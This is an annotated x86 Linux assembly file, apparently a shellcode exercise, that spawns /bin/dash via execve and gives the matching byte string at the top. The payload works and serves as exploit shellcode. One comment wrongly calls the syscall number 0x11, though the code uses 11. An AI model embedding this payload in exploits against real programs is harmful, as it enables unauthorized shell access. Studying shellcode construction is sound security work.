; SHELLCODE: "\x31\xc0\x50\x68\x64\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"

global _start

_start:
    ;----------------------------------

    xor eax, eax        ; Clear EAX
    push eax            ; Push null byte onto stack

    ; Push "/bin/dash" onto the stack 
    ; Because of little-endian it is in reverse order
    ; Need to append "///" to make it 12 bytes 
    ; "////" -> 0x2f 0x2f 0x2f 0x2f
    ; "bin/" -> 0x62 0x69 0x6e 0x2f
    ; "dash" -> 0x64 0x61 0x73 0x68
    
    push 0x68736164     ; "hsad"
    push 0x2f6e6962     ; "nib/"
    push 0x2f2f2f2f     ; "////"

    mov ebx, esp        ; filename: EBX points to the string on stack

    ; Construct argv array
    push eax            ; Push null terminator for argv
    push ebx            ; Push pointer to string
    mov ecx, esp        ; argv: ECX points to the argv array

    xor edx, edx        ; envp: null
    
    mov al, 11          ; sys_execve: 0x11
    int 0x80            ; call kernel

    ; ------------ End of file ------------